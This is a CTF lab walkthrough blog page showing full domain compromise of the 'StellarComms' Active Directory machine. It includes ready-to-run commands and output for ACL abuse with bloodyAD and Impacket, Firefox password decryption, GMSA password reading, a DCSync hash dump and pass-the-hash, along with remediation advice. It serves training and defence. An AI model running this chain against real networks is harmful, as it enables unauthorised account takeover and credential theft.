<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>StellarComms | Zerotrace Logs</title>
  <meta name="description" content="Complete walkthrough of StellarComms CTF machine. Active Directory exploitation covering anonymous FTP enumeration, ACL abuse (WriteOwner, WriteDACL, ForceChangePassword), Firefox credential extraction, and GMSA password reading for domain compromise." />

  <!-- Essential Open Graph tags for LinkedIn -->
  <meta property="og:title" content="StellarComms | Zerotrace Logs" />
  <meta property="og:description" content="Active Directory CTF walkthrough covering anonymous FTP, ACL abuse, Firefox credential extraction, GMSA exploitation, and DCSync attacks." />
  <meta property="og:image" content="https://z3rotrace.live/assets/stellarcomms/writeowner-acl.png" />
  <meta property="og:url" content="https://z3rotrace.live/HackSmarter/stellarcomms.html" />
  <meta property="og:type" content="article" />

  <!-- Twitter Card tags -->
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="StellarComms | Zerotrace Logs" />
  <meta name="twitter:description" content="Active Directory CTF walkthrough covering anonymous FTP, ACL abuse, Firefox credential extraction, GMSA exploitation, and DCSync attacks." />
  <meta name="twitter:image" content="https://z3rotrace.live/assets/stellarcomms/writeowner-acl.png" />

  <link rel="icon" type="image/png" href="../assets/favicon.png" sizes="32x32" />
  <link rel="apple-touch-icon" href="../assets/favicon.png" />
  <link rel="stylesheet" href="../style.css?v=5"/>
  <style>
    /* Machine info box styling */
    .machine-info {
      background: rgba(0, 170, 255, 0.05);
      border: 1px solid rgba(0, 170, 255, 0.25);
      border-left: 4px solid #c77dff;
      border-radius: 8px;
      padding: 1rem 1.25rem;
      margin: 1.5rem 0;
    }

    .machine-info ul {
      margin: 0;
      padding-left: 0;
    }

    .machine-info li {
      margin-bottom: 0.25rem;
    }

    .machine-info li::before {
      color: #00aaff;
    }

    /* Attack chain visualization */
    .attack-chain {
      background: #0d1117;
      border: 1px solid #30363d;
      border-left: 3px solid #c77dff;
      border-radius: 6px;
      padding: 1.25rem;
      margin: 1.5rem 0;
    }

    .attack-chain ol {
      margin: 0;
      padding-left: 0;
    }

    .attack-chain li {
      padding-left: 2.5rem;
      margin-bottom: 0.5rem;
    }

    /* Tools list styling */
    .tools-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 0.75rem;
      margin: 1rem 0;
    }

    .tools-grid li {
      background: rgba(0, 170, 255, 0.03);
      border-radius: 4px;
      padding: 0.5rem 0.75rem 0.5rem 1.5rem;
    }

    /* Difficulty color coding */
    .difficulty-easy { color: #3fb950; font-weight: 600; }
    .difficulty-medium { color: #d29922; font-weight: 600; }
    .difficulty-hard { color: #f85149; font-weight: 600; }

    /* Question/Answer boxes */
    .question {
      background: rgba(199, 125, 255, 0.1);
      border-left: 3px solid #c77dff;
      padding: 1rem;
      margin: 1rem 0 0.5rem 0;
      border-radius: 4px;
    }

    .answer {
      background: rgba(0, 170, 255, 0.05);
      border-left: 3px solid #00aaff;
      padding: 1rem;
      margin: 0 0 1rem 0;
      border-radius: 4px;
    }

    /* Responsive images */
    section img {
      max-width: 100%;
      height: auto;
      border: 1px solid rgba(0, 170, 255, 0.25);
      border-radius: 6px;
      margin: 1rem 0;
      display: block;
    }
  </style>
</head>
<body>
<header>
  <h1 class="terminal-title" aria-label="Zerotrace Logs">
    <span class="prompt" aria-hidden="true">$</span>
    <span class="typed" id="term-typing" aria-hidden="true"></span>
    <span class="cursor" id="term-cursor" aria-hidden="true"></span>
    <span class="sr-only">Zerotrace Logs</span>
  </h1>
</header>

<!-- Side hamburger control -->
<button id="sidebarToggle" class="hamburger-btn" aria-label="Toggle navigation" aria-controls="sidebar" aria-expanded="true">
  <span class="sr-only">Toggle navigation</span>
  <span class="hamburger-icon" aria-hidden="true"></span>
</button>

<!-- Sidebar navigation -->
<aside class="sidebar" id="sidebar" aria-label="Main navigation">
  <div class="sidebar-header">
    <h3>Navigate</h3>
    <button id="sidebarClose" class="sidebar-close" aria-label="Close navigation"><span aria-hidden="true">x</span></button>
  </div>
  <div class="sidebar-content">
    <ul class="sidebar-nav">
      <li><a href="../index.html">Home</a></li>
      <li class="has-submenu">
        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Writeups</button>
        <ul class="submenu" hidden>
          <li><a href="../writeups/ps-file-transfer-dns.html">PS File Transfer via DNS Lookup</a></li>
          <li><a href="../writeups/sliver-c2-getting-started.html">Getting Started with Sliver C2</a></li>
        </ul>
      </li>
      <li class="has-submenu">
        <button class="submenu-toggle" aria-expanded="true"><span class="arrow" aria-hidden="true"></span>HackSmarter Labs</button>
        <ul class="submenu">
          <li><a href="welcome.html">Welcome</a></li>
          <li><a href="staged.html">Staged</a></li>
          <li><a href="buildingmagic.html">BuildingMagic</a></li>
          <li><a href="arasaka.html">Arasaka</a></li>
          <li><a href="midgarden2-badsuccessor.html">Midgarden2</a></li>
          <li><a href="banksmarter.html">BankSmarter</a></li>
          <li><a href="ascension.html">Ascension</a></li>
          <li><a href="slayer.html">Slayer</a></li>
          <li><a href="anomaly.html">Anomaly</a></li>
          <li><a href="sharethepain.html">ShareThePain</a></li>
          <li><a href="sysco.html">Sysco</a></li>
          <li><a href="lumon.html">Lumon</a></li>
          <li><a href="stellarcomms.html">StellarComms</a></li>
          <li><a href="404bank.html">404-Bank</a></li>
        </ul>
      </li>
      <li><a href="../vector3.html">Certification Journey</a></li>
      <li class="has-submenu">
        <button class="submenu-toggle" aria-expanded="false"><span class="arrow" aria-hidden="true"></span>Projects</button>
        <ul class="submenu" hidden>
          <li><a href="../projects/dual-cloud-c2-redirector.html">Dual Cloud Redirector C2</a></li>
        </ul>
      </li>
    </ul>
  </div>
</aside>
<div class="sidebar-backdrop" id="sidebarBackdrop" aria-hidden="true"></div>

<section>
  <h2>StellarComms</h2>

  <div class="machine-info">
    <ul>
      <li><strong>Platform:</strong> CTF Challenge</li>
      <li><strong>Difficulty:</strong> <span class="difficulty-medium">Medium</span></li>
      <li><strong>Target:</strong> 10.1.248.71</li>
      <li><strong>Domain:</strong> stellarcomms.local</li>
      <li><strong>Key Topics:</strong> Active Directory ACL Abuse, Firefox Credentials, GMSA Exploitation</li>
    </ul>
  </div>

  <h3>Overview</h3>
  <p>Stellar Communications, a regional telecommunications provider, has engaged us to conduct a covert internal network penetration test. The client wants to assess the resilience of their Active Directory infrastructure against insider threats and compromised VPN endpoints.</p>

  <p>Our objective is to simulate a compromised remote worker scenario, enumerate Active Directory misconfigurations, pivot through the internal network, and ultimately compromise high-value targets including the domain controller.</p>

  <p><strong>Initial Access:</strong> Valid VPN access with a known username (<code>junior.analyst</code>), password unknown.</p>
  <p><strong>Goal:</strong> Complete domain compromise and extract Administrator credentials.</p>

  <h2>Reconnaissance</h2>

  <h3><span class="step">[Step 1]</span> Port Scanning</h3>
  <p>We initiated a comprehensive port scan to identify open services on the target domain controller:</p>
  <pre><code>$ nmap -p- -T4 -sC -sV -Pn -o nmap_scan 10.1.248.71</code></pre>

  <p><strong>Key findings:</strong></p>
  <ul>
    <li><strong>FTP (21/tcp)</strong> - Microsoft ftpd (Anonymous login allowed)</li>
    <li><strong>DNS (53/tcp)</strong> - Simple DNS Plus</li>
    <li><strong>HTTP (80/tcp)</strong> - Microsoft IIS httpd 10.0</li>
    <li><strong>Kerberos (88/tcp)</strong> - Confirms Active Directory</li>
    <li><strong>SMB (445/tcp)</strong> - SMB signing enabled and required</li>
    <li><strong>LDAP (389/tcp)</strong> - Active Directory LDAP</li>
    <li><strong>WinRM (5985/tcp)</strong> - Available for remote management</li>
    <li><strong>RDP (3389/tcp)</strong> - Microsoft Terminal Services</li>
  </ul>

  <p>The presence of anonymous FTP access on a domain controller (<code>DC-STELLAR.stellarcomms.local</code>) is unusual and warrants immediate investigation.</p>

  <h2>FTP Enumeration</h2>

  <h3><span class="step">[Step 2]</span> Anonymous FTP Access</h3>
  <p>Connecting to the FTP service with anonymous credentials revealed accessible directories:</p>
  <pre><code>$ ftp 10.1.248.71
# Username: anonymous
# Password: (press enter)</code></pre>

  <p><img src="../assets/stellarcomms/ftp-anonymous-login.png" alt="FTP Anonymous Login showing Docs, IT, and Pics directories"></p>

  <p>Three directories were discovered:</p>
  <ul>
    <li><code>Docs/</code> - Documentation files</li>
    <li><code>IT/</code> - IT-related content (empty)</li>
    <li><code>Pics/</code> - Pictures directory (empty)</li>
  </ul>

  <h3><span class="step">[Step 3]</span> Extracting FTP Contents</h3>
  <p>To efficiently download all files without corruption, we configured binary mode and disabled interactive prompts:</p>
  <pre><code>ftp> binary
200 Type set to I.
ftp> prompt off
Interactive mode off.
ftp> cd Docs
250 CWD command successful.
ftp> mget *</code></pre>

  <h3><span class="step">[Step 4]</span> Document Analysis</h3>
  <p>The <code>Docs</code> directory yielded several critical intelligence files:</p>

  <h4>Browser_policy.pdf</h4>
  <p>This document revealed a mandatory browser policy:</p>
  <p><img src="../assets/stellarcomms/firefox-esr-policy.png" alt="Firefox ESR Policy documentation"></p>
  <p><strong>Key Takeaway:</strong> Only Mozilla Firefox ESR (Extended Support Release) is approved and configured for internal portals. This suggests that users may have stored credentials in Firefox profiles - a valuable target for credential harvesting.</p>

  <h4>LEO_2A_Report.txt</h4>
  <p>This report disclosed an internal subdomain:</p>
  <p><img src="../assets/stellarcomms/internal-subdomain.png" alt="Internal subdomain portal.stellarcomms.local discovery"></p>
  <p><strong>Discovery:</strong> <code>portal.stellarcomms.local</code> - An internal web portal requiring authentication.</p>

  <h4>LEO_3B_Report.txt</h4>
  <p>Security requirements documentation:</p>
  <pre><code>Operators must log in with StellarComms domain accounts.
Multi-factor authentication is enforced for uplink operations.</code></pre>
  <p>This indicates domain account authentication and MFA requirements for certain operations.</p>

  <h4>LEO_5C_Report.txt</h4>
  <p>Password policy documentation:</p>
  <pre><code>Credentials must be rotated every 30 days as per StellarComms
security standards. Any login attempt with expired credentials
will be logged and locked automatically.</code></pre>
  <p><strong>Important:</strong> The organization enforces a 30-day password rotation policy with automatic account lockout for expired credentials. We should be cautious about password spraying to avoid locking accounts.</p>

  <h4>Stellar_UserGuide.pdf</h4>
  <p>The most valuable discovery - a default password disclosed in the user guide:</p>
  <p><img src="../assets/stellarcomms/default-password.png" alt="Default password Galaxy123! discovered in user guide"></p>
  <p><strong>Default password:</strong> <code>Galaxy123!</code></p>
  <p>This represents a common security misconfiguration where default credentials are documented but not properly rotated by end users.</p>

  <h2>Initial Foothold</h2>

  <h3><span class="step">[Step 5]</span> Testing Default Credentials</h3>
  <p>We tested the default password against the known username using NetExec:</p>
  <pre><code>$ nxc smb 10.1.248.71 -u 'junior.analyst' -p 'Galaxy123!'</code></pre>

  <p><img src="../assets/stellarcomms/credentials-validated.png" alt="Successful authentication with junior.analyst:Galaxy123!"></p>

  <p><strong>Success!</strong> The credentials <code>junior.analyst:Galaxy123!</code> are valid.</p>

  <h2>Active Directory Enumeration</h2>

  <h3><span class="step">[Step 6]</span> BloodHound Data Collection</h3>
  <p>With valid domain credentials, we used NetExec to collect comprehensive AD data for BloodHound analysis:</p>
  <pre><code>$ nxc ldap 10.1.248.71 -u 'junior.analyst' -p 'Galaxy123!' \
  --bloodhound --collection All --dns-server 10.1.248.71</code></pre>

  <p>BloodHound ingestion and analysis revealed a multi-step privilege escalation path through ACL abuse.</p>

  <h3><span class="step">[Step 7]</span> Attack Path Discovery</h3>
  <p>BloodHound identified a privilege escalation chain involving three critical relationships:</p>

  <h4>Step 1: WriteOwner on STELLAROPS-CONTROL Group</h4>
  <p><img src="../assets/stellarcomms/writeowner-acl.png" alt="BloodHound showing WriteOwner permission on STELLAROPS-CONTROL"></p>

  <div class="question">
    <strong>What is WriteOwner?</strong>
  </div>
  <div class="answer">
    The <code>junior.analyst</code> user has <strong>WriteOwner</strong> permissions on the <code>STELLAROPS-CONTROL</code> group. This ACL allows us to change the group's owner to ourselves. When you own an object in Active Directory, you can modify its DACL (Discretionary Access Control List) to grant yourself additional permissions. This is a common AD privilege escalation vector.
  </div>

  <h4>Step 2: ForceChangePassword on OPS.CONTROLLER</h4>
  <p><img src="../assets/stellarcomms/forcechangepassword-acl.png" alt="BloodHound showing ForceChangePassword permission on ops.controller"></p>

  <p>Members of the <code>STELLAROPS-CONTROL</code> group have <strong>ForceChangePassword</strong> permissions on the <code>ops.controller</code> user account. This allows any group member to reset the user's password without knowing the current password.</p>

  <h4>Step 3: Remote Management Users Membership</h4>
  <p><img src="../assets/stellarcomms/remote-management-access.png" alt="BloodHound showing ops.controller is member of Remote Management Users"></p>

  <p>The <code>ops.controller</code> user is a member of the <strong>Remote Management Users</strong> group, which grants WinRM access to the domain controller. This provides an authenticated shell once we control the account.</p>

  <p><strong>Complete Attack Chain:</strong></p>
  <pre><code>junior.analyst (WriteOwner)
    → STELLAROPS-CONTROL group (add self as member)
    → ForceChangePassword on ops.controller
    → WinRM access via Remote Management Users</code></pre>

  <h2>Privilege Escalation: Part 1</h2>

  <h3><span class="step">[Step 8]</span> Exploiting WriteOwner ACL</h3>
  <p>Using Impacket's <code>owneredit.py</code>, we changed the owner of the <code>STELLAROPS-CONTROL</code> group to <code>junior.analyst</code>:</p>
  <pre><code>$ owneredit.py -action write -new-owner 'junior.analyst' \
  -target 'StellarOps-Control' \
  'stellarcomms.local'/'junior.analyst':'Galaxy123!'</code></pre>

  <p><strong>Output:</strong></p>
  <pre><code>[*] Current owner information below
[*] - SID: S-1-5-21-1085439814-3345093241-3808503133-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=stellarcomms,DC=local
[*] OwnerSid modified successfully!</code></pre>

  <p>The group's owner was successfully changed from <code>Domain Admins</code> to <code>junior.analyst</code>.</p>

  <h3><span class="step">[Step 9]</span> Modifying Group DACL</h3>
  <p>Now as the owner, we used <code>dacledit.py</code> to grant ourselves <code>WriteMembers</code> permissions:</p>
  <pre><code>$ dacledit.py -action 'write' -rights 'WriteMembers' \
  -principal 'junior.analyst' \
  -target-dn 'CN=STELLAROPS-CONTROL,CN=USERS,DC=STELLARCOMMS,DC=LOCAL' \
  'stellarcomms.local'/'junior.analyst':'Galaxy123!'</code></pre>

  <p><strong>Output:</strong></p>
  <pre><code>[*] DACL backed up to dacledit-20260129-122456.bak
[*] DACL modified successfully!</code></pre>

  <div class="question">
    <strong>What is WriteDACL?</strong>
  </div>
  <div class="answer">
    Owning an object grants implicit WriteDACL permissions, allowing modification of the object's security descriptor. We're leveraging this to grant ourselves the ability to add members to the group.
  </div>

  <h3><span class="step">[Step 10]</span> Adding Junior.Analyst to STELLAROPS-CONTROL</h3>
  <p>Using BloodyAD, we added <code>junior.analyst</code> to the group:</p>
  <pre><code>$ bloodyAD -d stellarcomms.local -u junior.analyst -p 'Galaxy123!' \
  --host 10.1.248.71 add groupMember 'STELLAROPS-CONTROL' 'junior.analyst'

[+] junior.analyst added to STELLAROPS-CONTROL</code></pre>

  <h3><span class="step">[Step 11]</span> Forcing Password Reset on OPS.CONTROLLER</h3>
  <p>Now as a member of <code>STELLAROPS-CONTROL</code>, we can force a password change on <code>ops.controller</code>:</p>
  <pre><code>$ bloodyAD -d stellarcomms.local -u junior.analyst -p 'Galaxy123!' \
  --host 10.1.248.71 set password 'ops.controller' 'Zerotrace123!'

[+] Password changed successfully!</code></pre>

  <h3><span class="step">[Step 12]</span> Verification</h3>
  <p>Testing the new credentials:</p>
  <pre><code>$ nxc smb 10.1.248.71 -u 'ops.controller' -p 'Zerotrace123!'</code></pre>

  <p><img src="../assets/stellarcomms/ops-controller-validated.png" alt="Password change verification for ops.controller"></p>

  <p><strong>Authentication successful!</strong> We now control the <code>ops.controller</code> account.</p>

  <h2>Establishing WinRM Session</h2>

  <h3><span class="step">[Step 13]</span> WinRM Access</h3>
  <p>Since <code>ops.controller</code> is a member of the Remote Management Users group, we can establish a WinRM session:</p>
  <pre><code>$ evil-winrm -i 10.1.248.71 -u 'ops.controller' -p 'Zerotrace123!'</code></pre>

  <h3><span class="step">[User Flag]</span></h3>
  <p>Navigating to the user's desktop:</p>
  <pre><code>*Evil-WinRM* PS C:\Users\ops.controller\Desktop> type user.txt</code></pre>

  <p><img src="../assets/stellarcomms/user-flag.png" alt="User flag captured"></p>

  <p><strong>User flag captured!</strong></p>

  <h2>Credential Harvesting: Firefox Profile</h2>

  <h3><span class="step">[Step 14]</span> Locating Firefox Profile</h3>
  <p>Based on the browser policy documentation, we know Firefox ESR is the approved browser. Firefox stores saved credentials in the user's profile directory.</p>

  <p>Enumerating Firefox profiles:</p>
  <pre><code>*Evil-WinRM* PS C:\> cd C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles
*Evil-WinRM* PS> ls</code></pre>

  <p><img src="../assets/stellarcomms/firefox-profiles.png" alt="Firefox profiles showing default-esr profile"></p>

  <p>Two profiles exist:</p>
  <ul>
    <li><code>67wyfsfs.default</code></li>
    <li><code>v8mn7ijj.default-esr</code> (ESR profile - contains data)</li>
  </ul>

  <div class="question">
    <strong>How does Firefox store credentials?</strong>
  </div>
  <div class="answer">
    Firefox stores encrypted login credentials in two key files:
    <ul>
      <li><strong>logins.json:</strong> Contains encrypted username/password pairs</li>
      <li><strong>key4.db</strong> (or key3.db on older versions): Master encryption key database</li>
    </ul>
    To decrypt the credentials, we need both files.
  </div>

  <h3><span class="step">[Step 15]</span> Extracting Credential Files</h3>
  <p>Using Evil-WinRM's download function:</p>
  <pre><code>*Evil-WinRM* PS> cd C:\Users\ops.controller\AppData\Roaming\Mozilla\Firefox\Profiles\v8mn7ijj.default-esr
*Evil-WinRM* PS> download logins.json
*Evil-WinRM* PS> download key4.db</code></pre>

  <p>Create a local directory and place both files:</p>
  <pre><code>$ mkdir user_firefox_db
$ mv logins.json user_firefox_db/
$ mv key4.db user_firefox_db/</code></pre>

  <h3><span class="step">[Step 16]</span> Decrypting Firefox Credentials</h3>
  <p>Using the <code>firepwd</code> tool:</p>
  <pre><code>$ python firepwd/firepwd.py -d user_firefox_db

globalSalt: b'b775cce9871837920e459cb351f41a262a61a7ee'
password check? True
decrypting login/password pairs
Using 3DES (32-byte key, truncated to 24)
http://portal.stellarcomms.local:b'astro.researcher',b'[REDACTED]'</code></pre>

  <p><strong>Discovered Credentials:</strong></p>
  <ul>
    <li><strong>URL:</strong> <code>http://portal.stellarcomms.local</code></li>
    <li><strong>Username:</strong> <code>astro.researcher</code></li>
    <li><strong>Password:</strong> [REDACTED]</li>
  </ul>

  <h3><span class="step">[Step 17]</span> Validating New Credentials</h3>
  <pre><code>$ nxc smb 10.1.248.71 -u 'astro.researcher' -p '[REDACTED]'</code></pre>

  <p><img src="../assets/stellarcomms/astro-researcher-validated.png" alt="astro.researcher credentials validated"></p>

  <p><strong>Authentication successful!</strong> The <code>astro.researcher</code> account is valid.</p>

  <h2>Privilege Escalation: Part 2</h2>

  <h3><span class="step">[Step 18]</span> BloodHound Analysis of Astro.Researcher</h3>
  <p>Analyzing the <code>astro.researcher</code> account in BloodHound revealed another privilege escalation path:</p>

  <p><img src="../assets/stellarcomms/astro-researcher-path.png" alt="BloodHound showing astro.researcher attack path to GMSA"></p>

  <p>The <code>astro.researcher</code> user has:</p>
  <ol>
    <li><strong>WriteDacl</strong> permission on the <code>eng.payload</code> user account</li>
    <li>The <code>eng.payload</code> user has <strong>ReadGMSAPassword</strong> permission on the <code>SATLINK-SERVICE$</code> GMSA account</li>
  </ol>

  <div class="question">
    <strong>What are Group Managed Service Accounts (GMSA)?</strong>
  </div>
  <div class="answer">
    GMSAs are special Active Directory accounts designed for services. The domain automatically manages their passwords (typically 240 characters, rotated every 30 days). However, principals with <code>ReadGMSAPassword</code> permissions can retrieve the current password, which is essentially a hash that can be used for authentication.
  </div>

  <h3><span class="step">[Step 19]</span> Abusing WriteDacl</h3>
  <p>Using BloodyAD to grant ourselves <code>GenericAll</code> permissions on <code>eng.payload</code>:</p>
  <pre><code>$ bloodyAD --host 10.1.248.71 -d stellarcomms.local \
  -u 'astro.researcher' -p '[REDACTED]' \
  add genericAll 'eng.payload' 'astro.researcher'

[+] astro.researcher has now GenericAll on eng.payload</code></pre>

  <div class="question">
    <strong>What is GenericAll?</strong>
  </div>
  <div class="answer">
    <code>GenericAll</code> is a superset permission that includes all possible rights on an object, including the ability to reset passwords, modify attributes, and read all properties.
  </div>

  <h3><span class="step">[Step 20]</span> Forcing Password Reset on ENG.PAYLOAD</h3>
  <pre><code>$ bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local \
  -u 'astro.researcher' -p '[REDACTED]' \
  set password 'eng.payload' 'Zerotrace123@!'

[+] Password changed successfully!</code></pre>

  <p>We now control the <code>eng.payload</code> account with the password <code>Zerotrace123@!</code>.</p>

  <h2>Domain Compromise</h2>

  <h3><span class="step">[Step 21]</span> Reading GMSA Password</h3>
  <p>Using the compromised <code>eng.payload</code> account, we can now read the GMSA password for <code>SATLINK-SERVICE$</code>:</p>
  <pre><code>$ bloodyAD --host DC-STELLAR.stellarcomms.local -d stellarcomms.local \
  -u 'eng.payload' -p 'Zerotrace123@!' \
  get object 'SATLINK-SERVICE$' --attr msDS-ManagedPassword

distinguishedName: CN=SATLINK-SERVICE,CN=Managed Service Accounts,DC=stellarcomms,DC=local
msDS-ManagedPassword.NT: [REDACTED]
msDS-ManagedPassword.B64ENCODED: [REDACTED]</code></pre>

  <div class="question">
    <strong>Why is GMSA Password Reading Critical?</strong>
  </div>
  <div class="answer">
    GMSA accounts often have elevated privileges for service operations. In this case, the <code>SATLINK-SERVICE$</code> account has DCSync rights or equivalent privileges to extract the entire domain database. The GMSA hash can be used directly for Pass-the-Hash authentication.
  </div>

  <h3><span class="step">[Step 22]</span> NTDS.dit Extraction</h3>
  <p>Using Impacket's <code>secretsdump</code> with the GMSA hash to extract the NTDS.dit database:</p>
  <pre><code>$ impacket-secretsdump -hashes :'[REDACTED]' \
  -dc-ip DC-STELLAR.stellarcomms.local \
  'stellarcomms.local/satlink-service$@10.1.248.71'</code></pre>

  <div class="question">
    <strong>What is NTDS.dit?</strong>
  </div>
  <div class="answer">
    NTDS.dit is the Active Directory database file that stores all domain objects, including user accounts and their password hashes. Extracting this file (via DCSync or direct access) provides complete domain compromise, as it contains the NTLM hashes of all domain users including Domain Admins.
  </div>

  <p><strong>Output (partial):</strong></p>
  <pre><code>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
junior.analyst:1103:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
ops.controller:1104:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
astro.researcher:1105:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::
eng.payload:1106:aad3b435b51404eeaad3b435b51404ee:[REDACTED]:::</code></pre>

  <p>We now have the NTLM hash for the <code>Administrator</code> account!</p>

  <h3><span class="step">[Step 23]</span> Administrator Access via Pass-the-Hash</h3>
  <p>Using Evil-WinRM with the Administrator hash:</p>
  <pre><code>$ evil-winrm -i 10.1.248.71 -u Administrator -H [REDACTED]</code></pre>

  <h3><span class="step">[Root Flag]</span></h3>
  <pre><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt</code></pre>

  <p><img src="../assets/stellarcomms/root-flag.png" alt="Root flag captured"></p>

  <p><strong>Root flag captured!</strong> Complete domain compromise achieved.</p>

  <h2>Attack Chain Summary</h2>
  <div class="attack-chain">
    <ol>
      <li><strong>Anonymous FTP Access</strong> - Discovered documentation with default credentials</li>
      <li><strong>Default Password Discovery</strong> - Found Galaxy123! in user guide</li>
      <li><strong>junior.analyst compromise</strong> - Authenticated with default credentials</li>
      <li><strong>WriteOwner ACL abuse</strong> - Changed owner of STELLAROPS-CONTROL group</li>
      <li><strong>Add junior.analyst to STELLAROPS-CONTROL</strong> - Granted WriteMembers to self</li>
      <li><strong>ForceChangePassword on ops.controller</strong> - Reset password to gain control</li>
      <li><strong>WinRM access as ops.controller</strong> - User Flag obtained</li>
      <li><strong>Firefox credential extraction</strong> - Decrypted stored credentials from browser</li>
      <li><strong>astro.researcher compromise</strong> - Used extracted Firefox credentials</li>
      <li><strong>WriteDacl abuse on eng.payload</strong> - Granted GenericAll permissions</li>
      <li><strong>GenericAll → Force password reset</strong> - Compromised eng.payload account</li>
      <li><strong>ReadGMSAPassword on SATLINK-SERVICE$</strong> - Retrieved GMSA hash</li>
      <li><strong>NTDS.dit extraction via DCSync</strong> - Dumped entire domain database</li>
      <li><strong>Administrator hash extraction</strong> - Obtained Domain Admin credentials</li>
      <li><strong>Pass-the-Hash to Administrator</strong> - Root Flag obtained</li>
    </ol>
  </div>

  <h2>Key Vulnerabilities Identified</h2>

  <h4>1. Anonymous FTP Access on Domain Controller</h4>
  <p><strong>Risk:</strong> Critical</p>
  <p><strong>Issue:</strong> Sensitive documentation including default credentials was accessible via anonymous FTP.</p>
  <p><strong>Remediation:</strong> Disable anonymous FTP access and remove FTP service from domain controllers.</p>

  <h4>2. Default Credentials Not Rotated</h4>
  <p><strong>Risk:</strong> High</p>
  <p><strong>Issue:</strong> The default password <code>Galaxy123!</code> was documented but never changed by the end user.</p>
  <p><strong>Remediation:</strong> Enforce password changes on first login and remove default credentials from documentation.</p>

  <h4>3. Excessive ACL Permissions</h4>
  <p><strong>Risk:</strong> Critical</p>
  <p><strong>Issue:</strong> Low-privilege users had WriteOwner, WriteDacl, and ForceChangePassword permissions on privileged accounts.</p>
  <p><strong>Remediation:</strong> Review and remediate ACL misconfigurations using tools like BloodHound and PingCastle. Follow the principle of least privilege.</p>

  <h4>4. Saved Credentials in Firefox</h4>
  <p><strong>Risk:</strong> Medium</p>
  <p><strong>Issue:</strong> Domain credentials stored in Firefox profiles without master password protection.</p>
  <p><strong>Remediation:</strong> Enforce Firefox master passwords via GPO and implement credential management policies.</p>

  <h4>5. GMSA Password Readable by Non-Service Accounts</h4>
  <p><strong>Risk:</strong> Critical</p>
  <p><strong>Issue:</strong> Regular user accounts had ReadGMSAPassword permissions on privileged service accounts.</p>
  <p><strong>Remediation:</strong> Restrict GMSA password reading to only the computers/services that require them. Regularly audit msDS-GroupMSAMembership attributes.</p>

  <h4>6. Privileged GMSA Account</h4>
  <p><strong>Risk:</strong> Critical</p>
  <p><strong>Issue:</strong> The GMSA account had DCSync privileges, allowing complete domain database extraction.</p>
  <p><strong>Remediation:</strong> Apply least privilege principles to service accounts. Service accounts should not have domain-wide replication rights unless absolutely necessary.</p>

  <h2>Tools Used</h2>
  <ul class="tools-grid">
    <li><strong>nmap</strong> - Network reconnaissance and port scanning</li>
    <li><strong>NetExec (nxc)</strong> - SMB authentication testing and BloodHound data collection</li>
    <li><strong>BloodHound</strong> - Active Directory relationship mapping and attack path identification</li>
    <li><strong>Impacket owneredit.py</strong> - WriteOwner ACL exploitation</li>
    <li><strong>Impacket dacledit.py</strong> - DACL modification</li>
    <li><strong>Impacket secretsdump.py</strong> - NTDS.dit extraction via DCSync</li>
    <li><strong>BloodyAD</strong> - Active Directory privilege abuse (password resets, ACL modification, GMSA reading)</li>
    <li><strong>Evil-WinRM</strong> - Windows Remote Management client for shell access</li>
    <li><strong>firepwd</strong> - Firefox credential decryption tool</li>
  </ul>

  <h2>Lessons Learned</h2>

  <h3><span class="step pentester">For Pentesters</span></h3>
  <ul>
    <li><strong>Always enumerate thoroughly</strong> - The anonymous FTP access provided critical intelligence that enabled the entire attack chain</li>
    <li><strong>BloodHound is essential</strong> - Manual ACL enumeration would have been extremely time-consuming. BloodHound quickly identified the multi-hop privilege escalation path</li>
    <li><strong>Browser credential harvesting</strong> - Don't overlook browser profiles. Organizations that standardize on specific browsers often have users saving domain credentials</li>
    <li><strong>GMSA accounts are high-value targets</strong> - If you can read a GMSA password, check what permissions that service account has. They often have elevated privileges</li>
    <li><strong>Chain multiple low-risk findings</strong> - Each individual misconfiguration (WriteOwner, WriteDacl, ForceChangePassword) might seem minor, but chaining them together leads to complete domain compromise</li>
  </ul>

  <h3><span class="step defender">For Defenders</span></h3>
  <ul>
    <li><strong>Principle of Least Privilege</strong> - Review and remove unnecessary ACL permissions. Users should not have WriteOwner or WriteDacl on security groups</li>
    <li><strong>Secure Default Credentials</strong> - Never document default passwords in accessible locations. Enforce password changes on first login</li>
    <li><strong>Monitor ACL Changes</strong> - Implement monitoring for DACL modifications, especially on privileged groups and accounts</li>
    <li><strong>GMSA Hardening</strong> - Restrict ReadGMSAPassword permissions and ensure GMSA accounts follow least privilege principles</li>
    <li><strong>Credential Storage Policies</strong> - Implement browser master passwords and consider credential management solutions to prevent plaintext storage</li>
    <li><strong>Service Hardening</strong> - Domain controllers should not run unnecessary services like FTP. Minimize the attack surface</li>
  </ul>

  <h2>Conclusion</h2>
  <p>The StellarComms machine provided an excellent demonstration of modern Active Directory exploitation techniques. The attack chain required:</p>
  <ul>
    <li>Thorough enumeration and OSINT collection</li>
    <li>Understanding of Active Directory ACL abuse techniques</li>
    <li>Creative credential harvesting from non-traditional sources</li>
    <li>Knowledge of GMSA architecture and exploitation</li>
  </ul>

  <p>This machine serves as a valuable training ground for both offensive and defensive security professionals, showcasing realistic AD misconfigurations and the importance of proper security governance in Windows environments.</p>

  <p><em>Walkthrough completed on: 2026-01-29 | Zerotrace</em></p>

</section>

<footer>
  <div class="social-links" aria-label="Social media">
    <a href="https://github.com/0x0Trace" class="social github" target="_blank" rel="noopener" aria-label="GitHub profile">
      <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
